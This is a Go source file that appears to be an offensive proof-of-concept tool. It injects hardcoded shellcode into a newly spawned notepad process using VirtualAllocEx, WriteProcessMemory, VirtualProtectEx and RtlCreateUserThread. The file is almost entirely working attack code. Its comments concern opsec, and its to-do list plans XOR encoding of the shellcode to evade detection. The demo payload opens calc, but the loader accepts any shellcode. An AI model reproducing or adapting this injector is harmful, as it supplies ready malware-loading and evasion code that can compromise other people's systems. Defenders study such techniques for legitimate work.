/*

	RtlCreateUserThread shellcode injection technique

	currently creates an instance of notepad and injects to pop shellcode for calc


	METHOD:

			1. OpenProcess to get handle to PID with CREATE_THREAD_ACCESS (see below)
			2. VirtualAllocEx to create/reserve a read-write page in memory
			3. WriteProcessMemory copies shellcode to address of rw page
			4. VirtualProtectEx adjusts page to allow execution
			5. RtlCreateUserThread to resume execution
			6. CloseHandle closes handle to process

	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build rtlcreateuserthread.go -o rtlcreateuserthread.exe



*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010
)

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	targetprocess := flag.String("targetprocess", "C:\\WINDOWS\\system32\\notepad.exe", "Target process to spawn inject into (full path plz)")
	flag.Parse()

	//Pop Calc Shellcode - SOLID SHELLCODE POC
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	var psec windows.SecurityAttributes
	var tsec windows.SecurityAttributes

	argv := syscall.StringToUTF16Ptr(*targetprocess)

	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, 0, nil, nil, &si, &pi)

	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))

	}

	//Modifying permissions from RW to RX - VirtualProtectEx (RWX is bad and not opsec safe)
	rw := PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pi.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", pi.ProcessId))
	}

	var t_handle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call((uintptr)(unsafe.Pointer(pi.Process)), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&t_handle)), 0)

	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully called RtlCreateUserThread on PID %d", pi.ProcessId))
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pi.Process)))
	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", pi.ProcessId))
	}
}
